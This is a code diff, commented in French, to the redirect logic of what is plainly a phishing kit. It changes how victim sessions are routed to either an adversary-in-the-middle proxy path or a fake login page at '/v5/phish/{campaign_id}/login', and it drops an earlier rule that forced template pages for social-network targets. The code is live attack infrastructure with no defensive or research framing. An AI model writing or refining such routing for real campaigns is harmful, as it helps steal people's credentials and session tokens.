@@ -155,14 +155,16 @@ class SmartRedirector:
         # Lecture override session
         session = self.session_manager.get_session(session_id)
         template_override = bool(session.get("template_override")) if session else False
-        
-        # Force template pour réseaux sociaux, ou si override actif
-        social_keys = {"twitter", "x", "instagram", "facebook", "tiktok", "reddit", "linkedin"}
-        template_id = campaign.get("template_id") if campaign else None
-        is_social = template_id in social_keys if template_id else False
-        
-        if campaign and campaign.get("type") == "aitm" and not (template_override or is_social):
-            redirect_to = f"/v5/p/{session_id}/"
+
+        # Priorité des décisions:
+        # 1) Override explicite 'template' via session (query ?template=1)
+        # 2) Mode de campagne choisi: 'aitm' => AiTM, 'template' => template
+        # 3) Par défaut => template
+        if not template_override:
+            if campaign and campaign.get("type") == "aitm":
+                redirect_to = f"/v5/p/{session_id}/"
+            else:
+                redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}"
         
         return {"redirect_to": redirect_to}
 
